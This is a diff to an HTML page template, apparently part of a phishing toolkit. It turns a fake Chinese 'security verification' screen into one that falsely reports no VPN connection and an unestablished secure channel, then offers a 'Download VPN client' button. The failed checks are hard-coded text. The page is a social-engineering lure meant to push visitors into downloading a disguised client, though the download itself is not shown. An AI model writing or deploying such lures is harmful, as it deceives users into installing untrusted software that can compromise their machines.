@@ -9,27 +9,23 @@
 <body>
 <div class="ph-wrap">
   <div class="ph-card">
-    <div class="ph-shield">🛡</div>
+    <div class="ph-shield">🔒</div>
     <h1>安全验证</h1>
-    <p class="ph-sub">检测到异常访问行为,请完成以下验证以继续</p>
+    <p class="ph-sub">未检测到 VPN 连接，请下载安装 VPN 后再进行访问</p>
     <div class="ph-check">
-      <div class="ph-check-item">
-        <span class="ph-check-ico">✓</span>
-        <span>浏览器环境检测</span>
-        <span class="ph-check-state" id="st1">检测中...</span>
+      <div class="ph-check-item fail">
+        <span class="ph-check-ico">✗</span>
+        <span>VPN 连接检测</span>
+        <span class="ph-check-state" id="st1">未检测到</span>
       </div>
-      <div class="ph-check-item">
-        <span class="ph-check-ico">✓</span>
-        <span>访问行为分析</span>
-        <span class="ph-check-state" id="st2">检测中...</span>
-      </div>
-      <div class="ph-check-item">
-        <span class="ph-check-ico">✓</span>
-        <span>安全通道建立</span>
-        <span class="ph-check-state" id="st3">检测中...</span>
+      <div class="ph-check-item fail">
+        <span class="ph-check-ico">✗</span>
+        <span>网络安全通道</span>
+        <span class="ph-check-state" id="st2">未建立</span>
       </div>
     </div>
-    <p class="ph-tip">请勿关闭页面,验证将在数秒内完成...</p>
+    <a class="ph-btn" href="#" data-download="vpn_client" style="display:block;text-decoration:none;">下载 VPN 客户端</a>
+    <p class="ph-tip" id="ph-tip">安装 VPN 客户端并连接后，刷新页面即可正常访问。</p>
   </div>
   <p class="ph-foot">© 2026 安全中心 · {{host}}:{{port}}</p>
 </div>
